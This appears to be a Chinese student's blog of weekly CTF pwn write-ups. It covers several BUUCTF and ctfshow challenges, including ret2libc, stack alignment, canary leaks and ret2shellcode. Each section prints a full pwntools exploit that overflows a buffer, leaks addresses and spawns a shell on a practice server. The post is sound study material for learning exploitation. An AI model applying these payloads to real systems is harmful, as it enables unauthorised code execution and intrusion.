<h1 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h1><h1 id="buuctf-OGeek2019-babyrop"><a href="#buuctf-OGeek2019-babyrop" class="headerlink" title="buuctf_[OGeek2019]babyrop"></a>buuctf_[OGeek2019]babyrop</h1><p>checksec一下</p>
<img src="/yw/259342972/%5BOGeek2019%5Dbabyrop_1.png" class>
<p>32位，重定位表只读且堆栈不可执行<br>在ida中查看，没有后门等<br>只能ROPret2libc<br>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&#x2F;dev&#x2F;urandom是Linux的一个生成随机数文件，0代表只读，但是open函数还是返回一个大于0的数，read函数将fd写给buf，因此buf处的数是随机的。<br>将buf作为参数传给sub_804871F返回值赋值给v2，将v2作为参数传给 sub_80487D0。</p>
<p>sub_804871F函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804871F</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  memset函数：将某一块区域内容设置为指定内容，多用于数组的初始化。<br>  开始的两个 memset函数会将s和buf中元素都初始化为0.<br>  sprintf函数，这个在我写c结课设计项目时遇到过，他是把a1打印在s上。<br>  read函数从键盘读取0x20字节内容写入buf，并将返回值赋值给v5，查找资料的read函数返回值为读取的字节数。<br>  接下来判断buf和s大小，相等返回0，不相等返回非0的数程序就会终止。<strong>因此第一个任务就是使比较结果为0</strong><br>sub_80487D0函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">sub_80487D0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就不用说了。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在sub_804871F函数中，我们确定了第一个目的，防止程序退出，就要使strncmp(buf, s, v1)结果为0<br>可以看到v1 &#x3D; strlen(buf);这个总能看到，又是\x00截断，在输入时设置第一个元素为\x00<br>最后返回的时buf[7]，看sub_80487D0函数，我们需要将传入的参数尽可能大了写，这样才能栈溢出并进行想要的操作<br>所以在输入时就要将buf[7]也一起修改了。<br>另外，read函数的结束符也是算一个字节的，所以输入的时候只要*7就可以了<br>这里又用到了\这个符号，\为转义字符，’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。<br>这个用到扩展ASCII，因为键盘上能输入的字符对应最大的ASCII数不足以完成栈溢出。<br>关于这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/wz947324/article/details/80076496">推荐收藏</a><br>因此第一个payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>题目给了libc库版本，我本来不想用的，但是LibcSearcher找不到对应的版本，即使更新了也找不到，没办法又学会了一种方法。</p>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import*</span></span><br><span class="line"><span class="comment">#io=process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26594</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libcbase=write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>不想解释了，有些注意点</p>
<ol>
<li>32位程序函数参数直接压入栈中，即函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1&gt;···&gt;参数1</li>
<li><code>bin_sh=libcbase+next(libc.search(b&#39;/bin/sh&#39;))</code>行原本其他博客中是<code>binsh_libc=libc.search(&#39;/bin/sh&#39;).next()</code>，但是一用就报错，后来找到原因是因为python3取消了那种用法。</li>
</ol>
<h1 id="buuctf-HarekazeCTF2019-baby-rop"><a href="#buuctf-HarekazeCTF2019-baby-rop" class="headerlink" title="buuctf_[HarekazeCTF2019]baby_rop"></a>buuctf_[HarekazeCTF2019]baby_rop</h1><p>checksec</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_1.png" class>
<p>64位，堆栈不可执行<br> 拖入ida</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_2.png" class>
<p>f12+shift查看字符串窗口<br>找到好东西了，system和&#x2F;bin&#x2F;sh都有</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_3.png" class>
<p>查找地址后得到<br>bin_sh&#x3D;0x601048<br>system&#x3D;0x400490<br>再找溢出点，也很好找</p>
<img src="/yw/259342972/%5BHarekazeCTF2019%5Dbaby_rop_4.png" class>
<p>ida给出的栈长度是对的<br>最终exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27885</span>)</span><br><span class="line">pop_rdi=<span class="number">0x400683</span></span><br><span class="line">bin_sh=<span class="number">0x601048</span></span><br><span class="line">system=<span class="number">0x400490</span></span><br><span class="line">pop_ret=<span class="number">0x0400479</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>题目中提示ubuntu18，这个意思是要栈对齐，在之前的题目中提到过，就是system函数之前的字节数为16的倍数<br>所以这里用到pop_ret来凑数<br>有趣的是打通之后，<br>flag没有在当前目录，我还好奇的去群里问了一下，很快就找到方法<br>输入这条指令就能找到flag的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag</span><br></pre></td></tr></table></figure>

<h1 id="ctfshow-pwn04"><a href="#ctfshow-pwn04" class="headerlink" title="ctfshow_pwn04"></a>ctfshow_pwn04</h1><h2 id="泄露绕过"><a href="#泄露绕过" class="headerlink" title="泄露绕过"></a>泄露绕过</h2><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><img src="/yw/259342972/pwn04_1.png" class>

<p>32位，堆栈不可执行，还有canary保护，这是我第一次做关于绕过canary的题，看wp是肯定的</p>
<p>拖入ida</p>
<img src="/yw/259342972/pwn04_2.png" class>

<p>main函数调用了vuln函数，这是vuln函数</p>
<p>v3就是canary</p>
<p>题目让输入两次，一次用printf泄露canary，一次拿shell</p>
<h2 id="计算canary在printf函数处的偏移量"><a href="#计算canary在printf函数处的偏移量" class="headerlink" title="计算canary在printf函数处的偏移量"></a>计算canary在printf函数处的偏移量</h2><p>gdb调试，查看vuln函数汇编指令</p>
<img src="/yw/259342972/pwn04_3.png" class>

<p>第一个框是canary产生的位置，打印ebp-0xc就可以看到canary，记住此时的值</p>
<img src="/yw/259342972/pwn04_4.png" class>

<p>第二个框是printf，在此处打断点用来算偏移量</p>
<p>第三个框是检验canary的位置</p>
<p>在run之后查看栈，寻找canary的值，框出来的0x7c</p>
<img src="/yw/259342972/pwn04_5.png" class>

<p>0x7c &#x2F; 4 &#x3D; 0x1f&#x3D;31，据此可得canary在printf函数处的偏移量是31</p>
<p>根据格式化字符串漏洞，输入%31$x就可以打印出canary的值了</p>
<p>因此第一次输入的部分exp为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;Hacker!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;%31$x&quot;</span>)</span><br><span class="line">canary= <span class="built_in">int</span>(io.recv(),<span class="number">16</span>)<span class="comment">#将16进制数装换为整数</span></span><br></pre></td></tr></table></figure>

<p>接收canary用u32(io.recv(4))不行，我也不知道为啥，谁叫咱菜呢</p>
<p>ida查看栈结构确定canary在栈中的位置</p>
<img src="/yw/259342972/pwn04_6.png" class>

<p>忘了说后门了</p>
<p>在ida可以看到，很明显的，getshell</p>
<img src="/yw/259342972/pwn04_7.png" class>

<p>地址是getshell&#x3D;0x804859B</p>
<p>所以写payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(getshell)</span><br></pre></td></tr></table></figure>

<p>canary后面的12（8+4）也是根据ida看的</p>
<p>最终exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=process(<span class="string">&#x27;./ex2&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28165)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hacker!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;%31$x&quot;</span>)</span><br><span class="line">getshell=<span class="number">0x804859B</span></span><br><span class="line">canary= <span class="built_in">int</span>(io.recv(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(hex(canary))</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(getshell)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="第二种解法-覆盖绕过"><a href="#第二种解法-覆盖绕过" class="headerlink" title="第二种解法-覆盖绕过"></a>第二种解法-覆盖绕过</h2><p>从考核中其他师傅的wp中了解到的方法</p>
<p>canary格式是0x************00（最低位是\x00），因为是小端存储所以在最开始的地方是\x00（倒序存放），可以防止一些输出函数在输出前面内容时把canary连着也一起输出出来，有些输出函数遇到\x00会截断。</p>
<p>以canary为0xaaabaa00为例，在内存中存储为0x00aabaaa，这时我们在canary前面填入一个字符串，又恰好多输入一个字符，那么就能在后面输出时把canary也输出出来。</p>
<p>这也要看输入的函数，有些输入函数在输入完成后会在末尾加上\x00，这也是gets函数不能用来泄露canary的原因。</p>
<p>read函数不会再输入完成后再末尾加上\x00。</p>
<p>这道题用的就是read函数，所以用<strong>sendline</strong>先输入到canary，再利用下面的printf函数打印出canary的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>)<span class="comment">#100是从ida中看栈结构得出来的</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>)<span class="comment">#先把这100个a接收</span></span><br><span class="line">canary=u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span></span><br></pre></td></tr></table></figure>

<p>解释为什么要减去0xa</p>
<p>之前我有写要用sendline，其实不是一定的，sendline与send区别在于，sendline会多发送一个\n（换行符）</p>
<p>而\n对应的ascii值为0xa，上面也说了，数据在内存中倒序存放，所以在内从中canary应该是0xa123456（随意写的一个例子），直接接收到的canary应为0x654321a，减去0xa之后为0x6543210，倒序存放，又canary是以\x00结尾的，所以比对时canary值是没有改变的。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./ex2&#x27;</span>)</span><br><span class="line">getshell=<span class="number">0x0804859B</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">canary=u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(getshell)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="buuctf-ciscn-2019-n-5"><a href="#buuctf-ciscn-2019-n-5" class="headerlink" title="buuctf_ciscn_2019_n_5"></a>buuctf_ciscn_2019_n_5</h1><p>checksec一下</p>
<img src="/yw/259342972/ciscn_2019_n_5_1.png" class>
<p>基本没有保护，那就可以试试ret2shellcode了<br>拖入ida</p>
<img src="/yw/259342972/ciscn_2019_n_5_2.png" class>
<p>也很简单，name是bss段的，name写shellcode，gets溢出到name执行shellcode<br>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./c&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25169</span>)</span><br><span class="line">shellcode_addr=<span class="number">0x601080</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(shellcode_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name\n&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;me?\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>值得一提的是</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这行代码是很主要的，它表明了系统以及版本，如果不表明系统，生成的shellcode是32位的，那样就打不通。<br>还有，打本地也打不通。</p>
<h1 id="buuctf-ciscn-2019-en-2"><a href="#buuctf-ciscn-2019-en-2" class="headerlink" title="buuctf_ciscn_2019_en_2"></a>buuctf_ciscn_2019_en_2</h1><p>这个题和第八题是一样的，我没去了解为啥一样，重新做了一遍，仍是有不会的地方<br>checksec一下</p>
<img src="/yw/259342972/ciscn_2019_en_2_1.png" class>
<p>64位，堆栈不可执行<br>ida</p>
<img src="/yw/259342972/ciscn_2019_en_2_2.png" class>
<p>这是一个加密程序，选择1可以加密<br>这是加密函数</p>
<img src="/yw/259342972/ciscn_2019_en_2_3.png" class>
<p>绕过加密的办法：通过\x00截断strlen获取加密长度<br>还是直接给exp再解释</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#以前不会用，这次开始用感觉很方便，在接收数据时便于吸收其他没用的东西</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26149</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">pop_ret=<span class="number">0x4006b9</span><span class="comment">#这两个gadget很好找的</span></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"><span class="comment">#前面是\x00截断，rid传参，got是参数，plt是函数，main是返回地址（这是64位调用函数的方式）</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment">#这个是接收一行，去除末尾换行符，补齐到8位，直接用u64(io.recv(8))不行接到的数据是错的，我觉得可能是换行符的原因</span></span><br><span class="line"><span class="comment">#print(hex(puts_addr))</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(pop_ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(system)</span><br><span class="line"><span class="comment">#又在这里卡了一下，题目说了是ubuntu18，system有栈对齐的，所以用ret来凑数</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="第三周"><a href="#第三周" class="headerlink" title="第三周"></a>第三周</h1><h1 id="buuctf-not-the-same-3dsctf-2016"><a href="#buuctf-not-the-same-3dsctf-2016" class="headerlink" title="buuctf_not_the_same_3dsctf_2016"></a>buuctf_not_the_same_3dsctf_2016</h1><p>checksec</p>
<img src="/yw/259342972/not_the_same_3dsctf_2016_1.png" class>

<p>32位堆栈不可执行<br>ida<br>main函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[<span class="number">45</span>]; // [esp+Fh] [ebp-2Dh] BYREF</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有溢出<br>查看字符串窗口</p>
<img src="/yw/259342972/not_the_same_3dsctf_2016_2.png" class>

<p>看到了flag.txt<br>跟进后找到了get_secret()函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> get_secret()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v0; // esi</span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>地址为get_secret&#x3D;0x080489A0<br>这个函数打开了flag.txt文件并且存储到了<code>fl4g</code>位置</p>
<img src="/yw/259342972/not_the_same_3dsctf_2016_3.png" class>
